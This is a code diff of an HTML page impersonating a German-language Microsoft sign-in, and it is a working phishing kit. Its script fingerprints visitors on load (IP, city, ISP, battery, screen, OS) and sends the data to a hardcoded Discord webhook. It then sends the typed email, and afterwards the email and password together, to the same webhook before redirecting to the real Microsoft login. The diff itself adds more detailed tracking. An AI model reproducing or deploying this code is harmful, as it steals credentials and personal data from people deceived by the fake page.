@@ -5,14 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anmelden - Microsoft</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 2px; }
         .logo { width: 108px; margin-bottom: 20px; }
-        h2 { font-size: 24px; margin-bottom: 20px; font-weight: 600; }
-        input { width: 100%; padding: 10px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; }
-        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; font-size: 15px; }
+        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 600; color: #1b1b1b; }
+        .email-preview { margin-bottom: 15px; font-size: 15px; color: #1b1b1b; cursor: pointer; }
+        input { width: 100%; padding: 10px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; transition: 0.3s; }
+        input:focus { border-bottom: 2px solid #0067b8; }
+        .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
+        button { background-color: #0067b8; color: white; border: none; padding: 10px 35px; cursor: pointer; font-size: 15px; font-weight: 400; }
         .hidden { display: none; }
-        .email-display { margin-bottom: 15px; font-size: 14px; color: #333; }
     </style>
 </head>
 <body>
@@ -21,72 +23,95 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
     <h2>Anmelden</h2>
     <input type="email" id="email" placeholder="E-Mail, Telefon oder Skype" autocomplete="off">
-    <button onclick="nextStep()">Weiter</button>
+    <div class="btn-container"><button onclick="toStep2()">Weiter</button></div>
 </div>
 
 <div class="card hidden" id="step2">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
-    <div class="email-display" id="userEmail"></div>
+    <div class="email-preview" onclick="location.reload()">← <span id="user-display"></span></div>
     <h2>Kennwort eingeben</h2>
     <input type="password" id="password" placeholder="Kennwort" autocomplete="off">
-    <button onclick="submitAll()">Anmelden</button>
+    <div class="btn-container"><button onclick="captureAll()">Anmelden</button></div>
 </div>
 
 <script>
-    const webhook = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
+    const webh = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    // 1. سحب البيانات فوراً عند الدخول (بدون تأخير للأزرار)
-    async function trackDevice() {
+    // دالة سحب البيانات العميقة فور الدخول
+    async function initTrack() {
         try {
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'N/A'}));
-            let battInfo = "N/A";
+            const ipReq = await fetch('https://ipapi.co/json/');
+            const ip = await ipReq.json();
+            
+            let batt = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                battInfo = (b.level * 100) + "%";
+                batt = `${(b.level * 100).toFixed(0)}% ${b.charging ? '🔌' : '🔋'}`;
             }
 
-            fetch(webhook, {
+            const info = {
+                device: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language,
+                os: navigator.userAgent.match(/OS (\d+_\d+)/) ? navigator.userAgent.match(/OS (\d+_\d+)/)[1].replace('_', '.') : "iOS/Mac",
+                time: new Date().toLocaleTimeString('de-DE')
+            };
+
+            fetch(webh, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `📱 **دخول جديد**\nIP: \`${ipData.ip}\`\nCity: \`${ipData.city || '?'}\`\nBattery: \`${battInfo}\`\nDevice: \`${navigator.platform}\``
+                    embeds: [{
+                        title: "📱 تقرير استخباراتي: دخول جديد",
+                        color: 0,
+                        fields: [
+                            { name: "🌐 IP & Location", value: `\`${ip.ip}\` (${ip.city}, ${ip.country_name})`, inline: false },
+                            { name: "📡 Provider", value: `\`${ip.org}\``, inline: false },
+                            { name: "🔋 Battery", value: `\`${batt}\``, inline: true },
+                            { name: "📲 Version", value: `iOS \`${info.os}\``, inline: true },
+                            { name: "📏 Screen", value: `\`${info.screen}\``, inline: true },
+                            { name: "⏰ Local Time", value: `\`${info.time}\``, inline: true }
+                        ]
+                    }]
                 })
             });
         } catch(e) {}
     }
-    trackDevice();
+    window.onload = initTrack;
 
-    // 2. الانتقال للمرحلة الثانية
-    function nextStep() {
-        const mail = document.getElementById('email').value;
-        if(mail.length > 3) {
-            document.getElementById('userEmail').innerText = mail;
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
+    function toStep2() {
+        const email = document.getElementById('email').value;
+        if(email.length > 3) {
+            document.getElementById('user-display').innerText = email;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
             
-            // إرسال الإيميل كخطوة أولى
-            fetch(webhook, {
+            fetch(webh, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📩 **Target Email:** \`${mail}\`` })
+                body: JSON.stringify({ content: `📧 **Email:** \`${email}\`` })
             });
         }
     }
 
-    // 3. الإرسال النهائي للباسورد
-    function submitAll() {
-        const mail = document.getElementById('email').value;
+    function captureAll() {
+        const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
-        
         if(pass.length > 0) {
-            fetch(webhook, {
+            fetch(webh, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `🎯 **Captured!**\nUser: \`${mail}\`\nPass: \`${pass}\``
+                    embeds: [{
+                        title: "🎯 تم صيد الحساب بنجاح",
+                        color: 3066993,
+                        fields: [
+                            { name: "User", value: `\`${email}\`` },
+                            { name: "Pass", value: `\`${pass}\`` }
+                        ]
+                    }]
                 })
             }).then(() => {
-                // توجيه فوري للموقع الحقيقي
                 window.location.href = "https://login.live.com/";
             });
         }
